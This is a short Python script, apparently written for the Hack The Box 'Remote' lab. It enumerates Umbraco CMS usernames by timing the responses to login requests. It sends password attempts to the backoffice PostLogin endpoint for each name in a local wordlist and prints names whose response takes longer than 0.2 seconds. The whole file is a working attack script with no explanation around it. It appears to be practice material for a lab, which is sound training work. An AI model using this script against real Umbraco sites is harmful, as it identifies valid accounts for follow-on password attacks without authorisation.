import requests
import time

start = time.time()
url = 'http://remote.htb/umbraco/backoffice/UmbracoApi/Authentication/PostLogin'
data = {
        #'username':temp,
        'username':"admin@htb.local",
        'password':'a',
}
r = requests.post(url,data)
stop = time.time()
diff = stop-start
if(diff > .20):
    print(stop-start)

with open('/home/kali/snack/remote/trash/names.txt','r') as f:
    while line := f.readline():
        start = time.time()
        temp = line.strip()
        url = 'http://remote.htb/umbraco/backoffice/UmbracoApi/Authentication/PostLogin'
        data = {
                #'username':temp,
                'username':temp + "@htb.local",
                'password':'a',
        }
        r = requests.post(url,data)
        stop = time.time()
        diff = stop-start
        if(diff > .20):
            print(stop-start)
            print(temp)
